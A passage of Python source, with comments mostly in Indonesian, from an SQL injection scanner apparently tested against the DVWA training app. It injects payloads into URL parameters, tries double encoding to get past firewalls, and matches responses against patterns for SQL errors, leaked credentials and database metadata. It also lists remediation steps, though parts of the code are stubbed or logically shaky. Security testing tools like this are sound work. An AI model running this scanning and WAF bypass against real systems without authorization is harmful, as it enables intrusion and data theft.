            if response_body.strip().startswith('{') and response_body.strip().endswith('}'):
                data = json.loads(response_body)
                
                # Cari error message dalam JSON
                error_keys = ["error", "message", "errorMessage", "sqlMessage", "sqlError", "exception"]
                
                # Cek apakah ada error key yang mengandung pesan error SQL
                for key in error_keys:
                    if key in data and isinstance(data[key], str):
                        for pattern in self.error_patterns:
                            if pattern.search(data[key]):
                                return True
                                
                # Cek nested error
                if isinstance(data, dict):
                    for key, value in data.items():
                        if isinstance(value, dict):
                            for error_key in error_keys:
                                if error_key in value and isinstance(value[error_key], str):
                                    for pattern in self.error_patterns:
                                        if pattern.search(value[error_key]):
                                            return True
        except:
            # Bukan JSON valid, lanjutkan dengan pengecekan normal
            pass
            
        # Periksa apakah respons mengandung pesan error SQL
        for pattern in self.error_patterns:
            if pattern.search(response_body):
                return True
                
        return False
        
    def _analyze_response_content(self, response: HttpResponse, original_response: HttpResponse) -> Dict[str, Any]:
        """
        Analisis konten respons secara lebih mendalam
        
        Args:
            response: Respons dari request dengan payload
            original_response: Respons asli tanpa payload
            
        Returns:
            Dictionary dengan hasil analisis
        """
        result = {
            "is_error": False,
            "error_type": None,
            "has_data_leak": False,
            "data_leak_type": None,
            "response_diff": 0,
            "status_changed": False,
            "content_type_changed": False,
            "structure_changed": False,
            "evidence": None
        }
        
        # Periksa status code
        if response.status_code != original_response.status_code:
            result["status_changed"] = True
            
        # Periksa content type
        original_content_type = original_response.headers.get("Content-Type", "")
        response_content_type = response.headers.get("Content-Type", "")
        if original_content_type != response_content_type:
            result["content_type_changed"] = True
            
        # Periksa perbedaan ukuran respons
        if response.body and original_response.body:
            result["response_diff"] = len(response.body) - len(original_response.body)
            
        # Periksa error SQL
        if self._contains_sql_error(response.body):
            result["is_error"] = True
            result["error_type"] = "sql"
            result["evidence"] = self._extract_error_evidence(response.body)
            
        # Periksa kebocoran data
        data_leak_patterns = [
            (r"(?i)(?:user|username|email|password|hash|salt|secret|token|key|admin)", "credentials"),
            (r"(?i)(?:SELECT|FROM|WHERE|UNION|INSERT|UPDATE|DELETE|CREATE|ALTER|DROP)", "sql_command"),
            (r"(?i)(?:varchar|int\(|bigint|text|date|blob|float|double)", "sql_type"),
            (r"(?i)(?:information_schema|mysql|sys|performance_schema)", "db_metadata"),
            (r"(?i)(?:root@localhost|mysql\.user|mysql\.db)", "db_config"),
            (r"(?i)(?:0x[0-9a-f]{8,})", "hex_data"),
            (r"(?i)(?:\.\.\/|\.\.\\|\/etc\/|c:\\windows\\|\/var\/)", "path_traversal")
        ]
        
        for pattern, leak_type in data_leak_patterns:
            if re.search(pattern, response.body) and not re.search(pattern, original_response.body):
                result["has_data_leak"] = True
                result["data_leak_type"] = leak_type
                # Ekstrak bukti
                match = re.search(pattern, response.body)
                if match:
                    context_start = max(0, match.start() - 20)
                    context_end = min(len(response.body), match.end() + 20)
                    result["evidence"] = response.body[context_start:context_end]
                break
                
        # Periksa perubahan struktur HTML
        if "html" in response_content_type.lower() and "html" in original_content_type.lower():
            # Hitung jumlah tag HTML
            original_tags = len(re.findall(r"<[^>]+>", original_response.body))
            response_tags = len(re.findall(r"<[^>]+>", response.body))
            
            # Jika jumlah tag berubah signifikan
            if abs(original_tags - response_tags) > 5:
                result["structure_changed"] = True
                
        return result
        
    def _identify_database(self, response_body: str) -> str:
        """
        Identify the database type from error messages.
        
        Args:
            response_body: Response body to check
            
        Returns:
            Database type
        """
        if not response_body:
            return "unknown"
        
        for db_type, patterns in self.sql_errors.items():
            for pattern in patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    return db_type
        
        return "unknown"
    
    def _extract_error_evidence(self, response_body: str) -> str:
        """
        Extract SQL error message from response body.
        
        Args:
            response_body: Response body
            
        Returns:
            Extracted error message or empty string
        """
        if not response_body:
            return ""
        
        for pattern in self.error_patterns:
            match = pattern.search(response_body)
            if match:
                # Get the surrounding text (up to 100 chars before and after)
                start = max(0, match.start() - 100)
                end = min(len(response_body), match.end() + 100)
                return f"...{response_body[start:end]}..."
        
        return ""
    
    def _is_boolean_injection_detected(self, true_response: HttpResponse, false_response: HttpResponse) -> bool:
        """
        Check if boolean-based SQL injection is detected
        """
        # Check status codes
        if true_response.status_code != false_response.status_code:
            return True
            
        # Check response lengths
        if true_response.body and false_response.body:
            true_len = len(true_response.body)
            false_len = len(false_response.body)
            
            if abs(true_len - false_len) > 10:
                if not self._contains_sql_error(true_response.body) and not self._contains_sql_error(false_response.body):
                    return True
                    
            # Check for DVWA-specific output format
            true_lines = true_response.body.split("\n")
            false_lines = false_response.body.split("\n")
            
            if len(true_lines) != len(false_lines):
                return True
                
            # Check for differences in output format
            for true_line, false_line in zip(true_lines, false_lines):
                if "First name:" in true_line or "Surname:" in true_line:
                    if true_line != false_line:
                        return True
                        
        return False

    def _compare_responses(self, true_response: HttpResponse, false_response: HttpResponse, original_response: HttpResponse) -> bool:
        """
        Membandingkan response untuk mendeteksi perbedaan yang mengindikasikan SQL injection
        """
        # Compare response lengths
        true_len = len(true_response.body) if true_response.body else 0
        false_len = len(false_response.body) if false_response.body else 0
        orig_len = len(original_response.body) if original_response.body else 0
        
        # Check for significant length differences
        if abs(true_len - false_len) > 50:  # Threshold bisa disesuaikan
            return True
            
        # Check for error messages
        for pattern in self.error_patterns:
            if (pattern.search(true_response.body) or 
                pattern.search(false_response.body)):
                return True
                
        # Check for different HTTP status codes
        if true_response.status_code != false_response.status_code:
            return True
            
        return False

    def _is_true_response(self, response: HttpResponse) -> bool:
        """
        Mendeteksi apakah response mengindikasikan kondisi TRUE
        """
        # Check for success indicators
        success_patterns = [
            r"Login successful",
            r"Welcome back",
            r"User found",
            r"Record exists"
        ]
        
        for pattern in success_patterns:
            if re.search(pattern, response.body, re.IGNORECASE):
                return True
                
        return False

    def _is_false_response(self, response: HttpResponse) -> bool:
        """
        Mendeteksi apakah response mengindikasikan kondisi FALSE
        """
        # Check for failure indicators
        failure_patterns = [
            r"Invalid credentials",
            r"User not found",
            r"No records found",
            r"Access denied"
        ]
        
        for pattern in failure_patterns:
            if re.search(pattern, response.body, re.IGNORECASE):
                return True
                
        return False

    def _is_greater_response(self, response: HttpResponse) -> bool:
        """
        Mendeteksi apakah response mengindikasikan nilai yang lebih besar
        """
        # Implement logic to detect "greater than" condition
        greater_patterns = [
            r"Value too large",
            r"Number exceeds limit",
            r"Maximum value exceeded"
        ]
        
        for pattern in greater_patterns:
            if re.search(pattern, response.body, re.IGNORECASE):
                return True
                
        return False

    async def _get_data_length(self, url: str, param_name: str, query: str) -> int:
        """
        Mendapatkan panjang data menggunakan binary search
        """
        min_len = 0
        max_len = 100  # Adjust max length as needed
        
        while min_len <= max_len:
            mid = (min_len + max_len) // 2
            payload = query.replace("[LENGTH]", str(mid))
            
            response = await self._rate_limited_request(url, params={param_name: payload})
            
            if self._is_true_response(response):
                return mid
            elif self._is_false_response(response):
                if self._is_greater_response(response):
                    min_len = mid + 1
                else:
                    max_len = mid - 1
        
        return 0

    def _get_remediation_steps(self, technical_detail: Dict[str, Any]) -> Dict[str, Any]:
        """
        Memberikan rekomendasi mitigasi berdasarkan jenis kerentanan
        """
        remediation = {
            "description": "Rekomendasi untuk memperbaiki kerentanan SQL Injection",
            "steps": [
                "1. Gunakan Prepared Statements atau Parameterized Queries",
                "2. Validasi dan sanitasi input user",
                "3. Implementasikan escape string untuk karakter khusus",
                "4. Terapkan principle of least privilege pada database user",
                "5. Gunakan ORM framework yang aman"
            ],
            "code_examples": {
                "php": """
                    // Instead of:
                    $query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";
                    
                    // Use:
                    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
                    $stmt->execute([$_GET['id']]);
                """,
                "python": """
                    # Instead of:
                    cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")
                    
                    # Use:
                    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
                """,
                "java": """
                    // Instead of:
                    String query = "SELECT * FROM users WHERE id = '" + userId + "'";
                    
                    // Use:
                    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
                    stmt.setString(1, userId);
                """
            },
            "references": [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/sql-injection"
            ]
        }
        
        # Add specific recommendations based on injection type
        if technical_detail["injection_type"] == "time_based":
            remediation["steps"].extend([
                "6. Implementasikan timeout pada query database",
                "7. Monitor dan log query yang mencurigakan"
            ])
        elif technical_detail["injection_type"] == "union_based":
            remediation["steps"].extend([
                "6. Batasi informasi error database",
                "7. Enkripsi data sensitif di database"
            ])
            
        return remediation

    def _is_blind_injection_detected(self, response: HttpResponse) -> bool:
        """
        Check if blind SQL injection is detected
        """
        if not response.body:
            return False
            
        # Check for DVWA-specific output format
        lines = response.body.split("\n")
        for line in lines:
            if "First name:" in line or "Surname:" in line:
                # Check if we got more than one user's data
                user_count = sum(1 for l in lines if "First name:" in l)
                if user_count > 1:
                    return True
                    
        return False

    def _is_dvwa_empty_form(self, response: HttpResponse) -> bool:
        """
        Check if DVWA returned an empty form (indicating SQL error)
        """
        if not response.body:
            return False
            
        # Check if response contains form but no data
        if "<form" in response.body and "User ID:" in response.body:
            if "First name:" not in response.body and "Surname:" not in response.body:
                return True
                
        return False

    def _encode_payload_for_url(self, payload: str, double_encode: bool = False) -> str:
        """
        Encode payload untuk URL dengan mempertahankan karakter SQL injection
        
        Args:
            payload: Payload SQL injection
            double_encode: Apakah perlu double encoding (untuk bypass WAF)
            
        Returns:
            Payload yang sudah dienkode
        """
        # Karakter yang perlu dienkode
        special_chars = {
            ' ': '%20',
            '#': '%23',
            '&': '%26',
            '=': '%3D',
            '+': '%2B',
            ';': '%3B',
            '<': '%3C',
            '>': '%3E',
            '"': '%22',
            '{': '%7B',
            '}': '%7D',
            '|': '%7C',
            '\\': '%5C',
            '^': '%5E',
            '~': '%7E',
            '[': '%5B',
            ']': '%5D',
            '`': '%60',
        }
        
        # Karakter yang TIDAK boleh dienkode untuk menjaga payload tetap berfungsi
        preserve_chars = ["'", "(", ")", "*", "--", "/*", "*/", "="]
        
        encoded = payload
        
        # Enkode karakter spesial
        for char, encoded_char in special_chars.items():
            # Lewati karakter yang perlu dipertahankan
            if any(preserve in char for preserve in preserve_chars):
                continue
                
            if double_encode:
                # Double encode: % menjadi %25
                encoded_char = encoded_char.replace('%', '%25')
                
            encoded = encoded.replace(char, encoded_char)
            
        return encoded
        
    def _decode_url(self, url: str) -> str:
        """
        Decode URL yang terenkode
        
        Args:
            url: URL yang mungkin terenkode
            
        Returns:
            URL yang sudah didekode
        """
        try:
            # Coba decode URL
            return urllib.parse.unquote(url)
        except Exception:
            # Jika gagal, kembalikan URL asli
            return url
            
    def _normalize_url(self, url: str) -> str:
        """
        Normalisasi URL untuk konsistensi
        
        Args:
            url: URL yang akan dinormalisasi
            
        Returns:
            URL yang sudah dinormalisasi
        """
        try:
            # Parse URL
            parsed = urllib.parse.urlparse(url)
            
            # Normalisasi path
            path = parsed.path
            if not path:
                path = "/"
                
            # Urutkan query parameters
            if parsed.query:
                query_params = urllib.parse.parse_qs(parsed.query)
                normalized_query = urllib.parse.urlencode(
                    {k: query_params[k] for k in sorted(query_params.keys())},
                    doseq=True
                )
            else:
                normalized_query = ""
                
            # Rebuild URL
            return urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                path,
                parsed.params,
                normalized_query,
                parsed.fragment
            ))
        except Exception:
            # Jika gagal, kembalikan URL asli
            return url
            
    async def _test_parameter(self, target_url: str, param_name: str, param_value: str) -> List[Vulnerability]:
        """
        Test a single parameter for SQL injection vulnerabilities
        """
        vulnerabilities = []
        
        try:
            # Normalisasi URL
            target_url = self._normalize_url(target_url)
            
            # Get original response for comparison
            request, original_response = await self._safe_request(target_url)
            
            if not original_response:
                self.logger.error(f"Failed to get original response for {target_url}")
                return vulnerabilities
                
            # Test error-based injection
            for payload in self.test_payloads:
                try:
                    # Create test URL with payload
                    parsed_url = urllib.parse.urlparse(target_url)
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                    
                    # Encode payload jika diperlukan
                    encoded_payload = self._encode_payload_for_url(payload)
                    query_params[param_name] = [encoded_payload]
                    
                    # Ensure Submit parameter exists
                    if "Submit" not in query_params:
                        query_params["Submit"] = ["Submit"]
                    
                    # Rebuild URL with payload
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment
                    ))
                    
                    # Send request with payload
                    request, response = await self._safe_request(test_url)
                    
                    # Jika request gagal, lanjutkan ke payload berikutnya
                    if not response:
                        continue
                    
                    # Check for SQL errors
                    if self._contains_sql_error(response.body) or self._is_dvwa_empty_form(response):
                        db_type = self._identify_database(response.body)
                        evidence = self._extract_error_evidence(response.body)
                        
                        if not evidence and self._is_dvwa_empty_form(response):
                            evidence = "DVWA returned empty form (SQL error)"
                        
                        vuln = Vulnerability(
                            type=VulnerabilityType.SQL_INJECTION,
                            severity=VulnerabilitySeverity.HIGH,
                            url=target_url,
                            parameter=param_name,
                            payload=payload,
                            evidence=evidence,
                            technical_detail={
                                "database_type": db_type,
                                "injection_type": "error-based",
                                "original_value": param_value,
                                "error_message": evidence
                            }
                        )
                        
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, no need to test more payloads
                    
                    # Jika tidak ada error, coba dengan double encoding untuk bypass WAF
                    if not vulnerabilities:
                        # Encode payload dengan double encoding
                        double_encoded_payload = self._encode_payload_for_url(payload, double_encode=True)
                        query_params[param_name] = [double_encoded_payload]
                        
                        # Rebuild URL with double-encoded payload
                        new_query = urllib.parse.urlencode(query_params, doseq=True)
                        test_url = urllib.parse.urlunparse((
                            parsed_url.scheme,
                            parsed_url.netloc,
                            parsed_url.path,
                            parsed_url.params,
                            new_query,
                            parsed_url.fragment
                        ))
                        
                        # Send request with double-encoded payload
                        request, response = await self._safe_request(test_url)
                        
                        # Jika request gagal, lanjutkan ke payload berikutnya
                        if not response:
                            continue
                        
                        # Check for SQL errors
                        if self._contains_sql_error(response.body) or self._is_dvwa_empty_form(response):
                            db_type = self._identify_database(response.body)
                            evidence = self._extract_error_evidence(response.body)
                            
                            if not evidence and self._is_dvwa_empty_form(response):
                                evidence = "DVWA returned empty form (SQL error)"
                            
                            vuln = Vulnerability(
                                type=VulnerabilityType.SQL_INJECTION,
                                severity=VulnerabilitySeverity.HIGH,
                                url=target_url,
                                parameter=param_name,
                                payload=f"{payload} (double-encoded)",
                                evidence=evidence,
                                technical_detail={
                                    "database_type": db_type,
                                    "injection_type": "error-based",
                                    "original_value": param_value,
                                    "error_message": evidence,
                                    "encoding": "double-url"
                                }
                            )
                            
                            vulnerabilities.append(vuln)
                            break  # Found vulnerability, no need to test more payloads
                    
                    # Check for blind injection
                    if self._is_blind_injection_detected(response):
                        vuln = Vulnerability(
                            type=VulnerabilityType.SQL_INJECTION,
                            severity=VulnerabilitySeverity.HIGH,
                            url=target_url,
                            parameter=param_name,
                            payload=payload,
                            evidence="Multiple users returned when only one was expected",
                            technical_detail={
                                "injection_type": "blind",
                                "original_value": param_value,
                                "payload_type": "UNION-based"
                            }
                        )
                        
                        vulnerabilities.append(vuln)
                        break  # Found vulnerability, no need to test more payloads
                        
                except Exception as e:
                    self.logger.error(f"Error testing payload {payload} for parameter {param_name}: {str(e)}")
                    continue
            
            # Lanjutkan dengan pengujian lain jika belum menemukan kerentanan
            # ... (kode pengujian time-based dan boolean-based)
            
        except Exception as e:
            self.logger.error(f"Error testing parameter {param_name}: {str(e)}")
            import traceback
            self.logger.debug(traceback.format_exc())
        
        return vulnerabilities

    def _detect_sql_injection(self, response: HttpResponse, original_response: HttpResponse) -> bool:
        """
        Deteksi SQL injection berdasarkan perbandingan respons
        
        Args:
            response: Respons dari request dengan payload
            original_response: Respons asli tanpa payload
            
        Returns:
            True jika terdeteksi SQL injection, False jika tidak
        """
        # Analisis respons
        analysis = self._analyze_response_content(response, original_response)
        
        # Deteksi berdasarkan hasil analisis
        if analysis["is_error"] and analysis["error_type"] == "sql":
            return True
            
        if analysis["has_data_leak"]:
            return True
            
        if analysis["status_changed"] and analysis["response_diff"] > 100:
            return True
            
        if analysis["structure_changed"] and self._detect_union_injection(response):
            return True
            
        return False
        
    def _detect_union_injection(self, response: HttpResponse) -> bool:
        """
        Deteksi UNION-based SQL injection
        
        Args:
            response: Respons dari request dengan payload
            
        Returns:
            True jika terdeteksi UNION injection, False jika tidak
        """
        if not response.body:
            return False
            
        # Pola untuk mendeteksi hasil UNION injection
        union_patterns = [
            # Deteksi tabel yang tidak terkait muncul dalam hasil
            r"(?i)(?:username|user_?id|admin_name|email|pass(?:word)?)\s*:\s*(?:root|admin|administrator|dbadmin)",
            # Deteksi nilai database yang bocor
            r"(?i)version\s*:\s*(?:[\d\.]+|mysql|postgresql|oracle|sql\s*server)",
            # Deteksi multiple columns dari UNION
            r"(?i)(?:id|user_?id)\s*:\s*\d+.*?(?:name|username)\s*:\s*[^\n<>\"']+.*?(?:pass(?:word)?|hash|email)\s*:\s*[^\n<>\"']+",
            # Deteksi data yang tidak terkait dengan query asli
            r"(?i)(?:table_name|column_name)\s*:\s*[^\n<>\"']+",
            # Deteksi metadata database
            r"(?i)(?:database|schema)\s*:\s*[^\n<>\"']+"
        ]
        
        for pattern in union_patterns:
            if re.search(pattern, response.body):
                return True
                
        # Deteksi hasil NULL dari UNION SELECT NULL
        null_pattern = r"(?i)(?:NULL,NULL|NULL,NULL,NULL|NULL,NULL,NULL,NULL)"
        if re.search(null_pattern, response.body):
            return True
            
        return False
        
    def _parse_response_format(self, response: HttpResponse) -> str:
        """
        Mendeteksi format respons (HTML, JSON, XML, dll)
        
        Args:
            response: Respons HTTP
            
        Returns:
            Format respons yang terdeteksi
        """
        # Periksa Content-Type header
        content_type = response.headers.get("Content-Type", "").lower()
        
        if "application/json" in content_type:
            return "json"
        elif "application/xml" in content_type or "text/xml" in content_type:
            return "xml"
        elif "text/html" in content_type:
            return "html"
        elif "text/plain" in content_type:
            return "text"
        
        # Jika header tidak memberikan informasi yang cukup, periksa konten
        body = response.body
        
        # Coba deteksi JSON
        if body.strip().startswith('{') and body.strip().endswith('}'):
            try:
                json.loads(body)
                return "json"
            except json.JSONDecodeError:
                pass
                
        # Coba deteksi XML
        if body.strip().startswith('<') and body.strip().endswith('>'):
            if '<?xml' in body or '<html' in body:
                return "xml" if '<?xml' in body else "html"
                
        # Default ke text
        return "text"
        
    def _extract_json_evidence(self, response_body: str) -> str:
        """
        Ekstrak bukti SQL injection dari respons JSON
        
        Args:
            response_body: Respons dalam format JSON
            
        Returns:
            String bukti SQL injection
        """
        try:
            # Parse JSON
            data = json.loads(response_body)
            
            # Cari error message
            error_keys = ["error", "message", "errorMessage", "sqlMessage", "sqlError", "exception"]
            for key in error_keys:
                if key in data:
                    return f"{key}: {data[key]}"
                    
            # Cari nested error
            if isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, dict) and any(error_key in value for error_key in error_keys):
                        for error_key in error_keys:
                            if error_key in value:
                                return f"{key}.{error_key}: {value[error_key]}"
                                
            # Jika tidak ada error spesifik, kembalikan JSON yang diformat
            return json.dumps(data, indent=2)[:200] + "..." if len(response_body) > 200 else response_body
            
        except json.JSONDecodeError:
            # Jika bukan JSON valid, kembalikan sebagian respons
            return response_body[:200] + "..." if len(response_body) > 200 else response_body
            
    def _extract_xml_evidence(self, response_body: str) -> str:
        """
        Ekstrak bukti SQL injection dari respons XML
        
        Args:
            response_body: Respons dalam format XML
            
        Returns:
            String bukti SQL injection
        """
        # Cari error message dalam XML
        error_patterns = [
            r"<error>(.*?)</error>",
            r"<message>(.*?)</message>",
            r"<exception>(.*?)</exception>",
            r"<sqlError>(.*?)</sqlError>"
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, response_body, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1)
                
        # Jika tidak ada error spesifik, kembalikan sebagian XML
        return response_body[:200] + "..." if len(response_body) > 200 else response_body
        
    def _extract_evidence(self, response: HttpResponse) -> str:
        """
        Ekstrak bukti SQL injection dari respons
        
        Args:
            response: Respons dari request dengan payload
            
        Returns:
            String bukti SQL injection
        """
        if not response.body:
            return ""
            
        # Deteksi format respons
        response_format = self._parse_response_format(response)
        
        # Ekstrak bukti berdasarkan format
        if response_format == "json":
            return self._extract_json_evidence(response.body)
        elif response_format == "xml":
            return self._extract_xml_evidence(response.body)
            
        # Format HTML atau text
        # Cari error SQL
        for pattern in self.error_patterns:
            match = pattern.search(response.body)
            if match:
                # Ambil konteks sekitar error
                context_start = max(0, match.start() - 50)
                context_end = min(len(response.body), match.end() + 50)
                return response.body[context_start:context_end]
                
        # Cari tanda UNION injection
        union_patterns = [
            r"(?i)(?:username|user_?id|admin_name|email|pass(?:word)?)\s*:\s*(?:root|admin|administrator|dbadmin)",
            r"(?i)version\s*:\s*(?:[\d\.]+|mysql|postgresql|oracle|sql\s*server)",
            r"(?i)(?:table_name|column_name)\s*:\s*[^\n<>\"']+"
        ]
        
        for pattern in union_patterns:
            match = re.search(pattern, response.body)
            if match:
                context_start = max(0, match.start() - 50)
                context_end = min(len(response.body), match.end() + 50)
                return response.body[context_start:context_end]
                
        # Jika tidak ada bukti spesifik, ambil bagian awal respons
        if len(response.body) > 200:
            return response.body[:200] + "..."
        else:
            return response.body 